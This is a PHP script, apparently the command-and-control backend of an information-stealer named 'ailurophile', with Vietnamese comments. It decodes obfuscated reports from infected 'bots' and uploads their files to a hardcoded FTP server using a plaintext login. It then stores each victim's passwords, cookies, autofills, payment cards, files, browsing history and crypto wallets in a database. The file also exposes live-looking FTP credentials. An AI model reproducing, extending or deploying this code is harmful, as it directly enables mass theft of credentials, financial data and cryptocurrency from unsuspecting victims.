<?php
include __DIR__ . "/api/config.php";

$data = isset($_GET['data']) ? $_GET['data'] : '';
$hash = isset($_GET['hash']) ? $_GET['hash'] : '';

$logFile = 'logftp.txt'; // File log cho FTP

function writeLog($message, $logFile) {
    file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . $message . PHP_EOL, FILE_APPEND);
}

if (empty($data) || empty($hash)) {
    writeLog("Missing data or hash", $logFile);
    echo json_encode(['status' => 'error', 'message' => 'Dont try to hack me !!!!']);
    exit();
}

$decrypted_data = ailurophile_decrypt(base64_decode($data), $hash);
$decoded_data = base64_decode($decrypted_data);
$obj = json_decode($decoded_data);

if (!$obj) {
    writeLog("Decryption failed or invalid JSON data", $logFile);
    echo json_encode(['status' => 'error', 'message' => 'Dont try to hack me !!!!']);
    exit();
}

// Thông tin FTP
$ftp_server = "ftp.greensyssolutions.com";
$ftp_username = "logs@greensyssolutions.com";
$ftp_password = "he;Mi4W5[[zV";

// Kết nối tới FTP server
$conn_id = ftp_connect($ftp_server);
if (!$conn_id) {
    writeLog("Failed to connect to FTP server", $logFile);
    die(json_encode(['status' => 'error', 'message' => 'Cannot connect to FTP server']));
} else {
    writeLog("Connected to FTP server", $logFile);
}

// Đăng nhập vào FTP server
if (!ftp_login($conn_id, $ftp_username, $ftp_password)) {
    writeLog("FTP login failed", $logFile);
    ftp_close($conn_id);
    die(json_encode(['status' => 'error', 'message' => 'FTP login failed']));
} else {
    writeLog("FTP login successful", $logFile);
}

// Đặt chế độ thụ động (nếu cần)
ftp_pasv($conn_id, true);
writeLog("Set passive mode", $logFile);

// Lấy username từ user_id
$user_id = $obj->user_id;
$stmt = $pdo->prepare("SELECT username FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    writeLog("User not found with ID: $user_id", $logFile);
    die(json_encode(['status' => 'error', 'message' => 'User not found']));
}

$username = $user['username'];
writeLog("Username retrieved: " . $username, $logFile);

// Đường dẫn lưu trữ trên FTP theo username
$userFolder = '/' . $username; // Thư mục sẽ là /username trong thư mục gốc của FTP

// Kiểm tra và tạo thư mục nếu chưa tồn tại
if (!@ftp_chdir($conn_id, $userFolder)) {
    writeLog("User folder does not exist, attempting to create: " . $userFolder, $logFile);
    if (ftp_mkdir($conn_id, $userFolder)) {
        ftp_chdir($conn_id, $userFolder);
        writeLog("User folder created successfully: " . $userFolder, $logFile);
    } else {
        writeLog("Failed to create user folder on FTP: " . $userFolder, $logFile);
        ftp_close($conn_id);
        die(json_encode(['status' => 'error', 'message' => 'Failed to create user folder on FTP']));
    }
} else {
    writeLog("User folder exists: " . $userFolder, $logFile);
}

// Kiểm tra xem tệp đã được tải lên thông qua yêu cầu POST chưa
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $destPath = $userFolder . '/' . uniqid() . '-' . basename($file['name']);

    if ($file['error'] === UPLOAD_ERR_OK) {
        $fileTmpPath = $file['tmp_name'];
        $fileSize = $file['size'];
        $fileType = $file['type'];
        writeLog("Received file: " . $file['name'] . " | Size: " . $fileSize . " bytes | Type: " . $fileType, $logFile);

        // Upload tệp lên FTP
        if (ftp_put($conn_id, $destPath, $fileTmpPath, FTP_BINARY)) {
            writeLog("File uploaded to FTP successfully: " . $destPath, $logFile);

            $create_at = date('Y-m-d H:i:s');
            $stmt = $pdo->prepare("INSERT INTO bots (user_id, path_file, created_at, bot_hostname, bot_ip, bot_type, bot_passwords, bot_cookies, bot_autofills, bot_cards, bot_files, bot_history, bot_wallet, bot_country) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
            if (!isset($obj->country)) {
                $obj->country = "";
            }
            $stmt->execute([$obj->user_id, basename($destPath), $create_at, $obj->hostname, $obj->ip, $obj->type, $obj->passwords, $obj->cookies, $obj->autofills, $obj->cards, $obj->files, $obj->history, $obj->wallet, $obj->country]);

            writeLog("Inserted into database: " . basename($destPath), $logFile);
            echo json_encode(['status' => 'success', 'message' => 'File uploaded and saved successfully.']);
        } else {
            writeLog("Failed to upload file to FTP: " . $destPath, $logFile);
            echo json_encode(['status' => 'error', 'message' => 'Failed to upload file to FTP.']);
        }
    } else {
        writeLog("File upload error: " . $file['error'], $logFile);
        echo json_encode(['status' => 'error', 'message' => 'File upload error.']);
    }
} else {
    writeLog("Invalid request method or no file uploaded", $logFile);
    echo json_encode(['status' => 'error', 'message' => 'Invalid request.']);
}

// Đóng kết nối FTP
ftp_close($conn_id);
writeLog("FTP connection closed", $logFile);

// Hàm giải mã tùy chỉnh
function ailurophile_decrypt($data, $key) {
    if (empty($key)) {
        throw new Exception("Decryption key cannot be empty");
    }
    
    $key_length = strlen($key);
    $data = base64_decode($data);
    $data_length = strlen($data);
    $decrypted_data = '';

    for ($i = 0; $i < $data_length; $i++) {
        $decrypted_data .= chr((ord($data[$i]) - ord($key[$i % $key_length]) + 256) % 256);
    }

    return $decrypted_data;
}
?>
